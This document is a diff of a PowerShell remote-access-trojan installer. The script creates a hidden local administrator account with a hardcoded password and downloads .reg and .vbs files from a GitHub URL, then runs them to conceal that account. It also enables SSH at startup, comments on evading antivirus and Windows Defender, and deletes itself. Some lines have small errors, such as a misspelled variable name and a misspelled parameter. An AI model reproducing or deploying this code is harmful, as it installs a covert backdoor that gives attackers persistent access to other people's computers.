@@ -36,17 +36,20 @@ cd $path
 # create admin user
 Remove-LocalUser -Name "WindowsGuest"
 $NewLocalAdmin = "WindowsGuest"
-$String = RpLGWiUsIy
-$Password = (ConvertTo-SecureString $String -AsPlainText -Force)
+$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # create registery to hide local admin
 $reg_file = random_text
-Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
+Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
 "$reg_file.reg"
 
 # visual basic script to register the registery
-./"$reg_file.reg";"vbs_file.vbs"
+$vbs_file = random_text
+Invoke-WebRequest -Uri raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs -OutFile 
+"$vbs_file.vbs"
+
+./"$reg_file.reg";"$vsb_file.vbs"
 
 # dont disable wdef until need to, not av detectable up until here
 
@@ -57,5 +60,6 @@ Set-Service -Name sshd
 -StartupTpe 'Automatic'
 Get-NetFireWallRule -Name *ssh*
 
+# self delete
 cd $initial_dir
 del rat_installer.ps1
